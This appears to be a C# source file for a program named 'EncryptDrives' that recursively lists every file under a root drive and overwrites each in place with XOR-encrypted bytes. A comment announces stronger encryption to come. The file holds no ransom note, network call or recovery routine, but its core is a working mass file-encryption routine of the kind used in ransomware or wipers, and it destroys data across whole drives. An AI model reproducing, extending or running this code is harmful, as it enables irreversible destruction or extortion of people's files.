using System;
using System.Collections.Generic;
using System.IO;

namespace EncryptDrives
{
    public class Crypt
    {
        string RootDrive;

        public byte _xorKey = 0x69;

        List<string> Files = new List<string>();

        public Crypt(string drive)
        {
            RootDrive = drive;
        }

        public void CipherDrive(string Root)
        {
            // Take a snapshot of the file system.
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(Root);

            // This method assumes that the application has discovery permissions
            // for all folders under the specified path.
            RecursiveSearch(dir);

            foreach (string f in Files)
            {
                CipherFile(f);
            }
        }

        public void RecursiveSearch(System.IO.DirectoryInfo dir) 
        {
            try
            {      
                foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
                {             
                    this.Files.Add(f.FullName);
                }

                // Write the names of the subfolders in the folder.
                foreach (System.IO.DirectoryInfo d in dir.GetDirectories())
                {
                    // Recursive call for each subdirectory.
                    RecursiveSearch(d);
                }
            }
            catch (System.Exception ex)
            {
                Console.WriteLine("The process failed: {0}", ex.ToString());
            }
        }

        public void CipherFile(string FileName)
        {
            try
            {
                Console.WriteLine("Ciphering: " + FileName);
                XorCipherFile(FileName, this._xorKey); //we can add more advanced crypt methods after everything else is working 100%
            }
            catch (Exception e)
            {
                Console.WriteLine("Failed to encrypt: " + e.Message);
            }
        }

        public static void XorCipherFile(string filePath, byte key)
        {
            byte[] fileBytes;
            try
            {
                fileBytes = File.ReadAllBytes(filePath);
                for (int i = 0; i < fileBytes.Length; i++)
                {
                    fileBytes[i] ^= key;
                }
                File.WriteAllBytes(filePath, fileBytes);
            }
            catch (IOException e)
            {
                Console.WriteLine("An error occured: " + e.Message);
            }
        }
    }

}
